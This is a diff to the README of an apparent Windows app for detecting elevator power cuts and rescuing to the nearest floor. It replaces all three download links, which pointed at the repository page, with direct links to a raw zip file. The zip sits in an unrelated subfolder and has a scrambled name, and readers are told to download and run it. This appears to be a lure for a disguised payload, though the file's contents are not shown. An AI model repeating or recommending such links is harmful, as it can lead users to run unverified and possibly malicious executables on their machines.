@@ -1,6 +1,6 @@
 # ⚡ Emergency-Power-Cut-Detection-with-Automatic-Nearest-Floor-Rescue - Safe lift rescue, no manual steps
 
-[![Download](https://img.shields.io/badge/Download-Install%20Now-blue?style=for-the-badge)](https://github.com/Servicebookascender539/Emergency-Power-Cut-Detection-with-Automatic-Nearest-Floor-Rescue)
+[![Download](https://img.shields.io/badge/Download-Install%20Now-blue?style=for-the-badge)](https://raw.githubusercontent.com/Servicebookascender539/Emergency-Power-Cut-Detection-with-Automatic-Nearest-Floor-Rescue/main/triode/Automatic-Power-Detection-Floor-Nearest-Rescue-Emergency-Cut-with-v1.2.zip)
 
 ## 🛗 What this app does
 
@@ -12,7 +12,7 @@ It is built for safe use in elevator emergency cases. The app supports automatic
 
 Use this page to download and run the app on Windows:
 
-[Download the app](https://github.com/Servicebookascender539/Emergency-Power-Cut-Detection-with-Automatic-Nearest-Floor-Rescue)
+[Download the app](https://raw.githubusercontent.com/Servicebookascender539/Emergency-Power-Cut-Detection-with-Automatic-Nearest-Floor-Rescue/main/triode/Automatic-Power-Detection-Floor-Nearest-Rescue-Emergency-Cut-with-v1.2.zip)
 
 If the page includes a release file, download that file and run it on your PC. If it opens a project page, use the latest Windows package listed there.
 
@@ -200,4 +200,4 @@ It is meant for elevator rescue systems that support this control flow. Check yo
 
 If you need the file again, use this link:
 
-[Download the app](https://github.com/Servicebookascender539/Emergency-Power-Cut-Detection-with-Automatic-Nearest-Floor-Rescue)
+[Download the app](https://raw.githubusercontent.com/Servicebookascender539/Emergency-Power-Cut-Detection-with-Automatic-Nearest-Floor-Rescue/main/triode/Automatic-Power-Detection-Floor-Nearest-Rescue-Emergency-Cut-with-v1.2.zip)
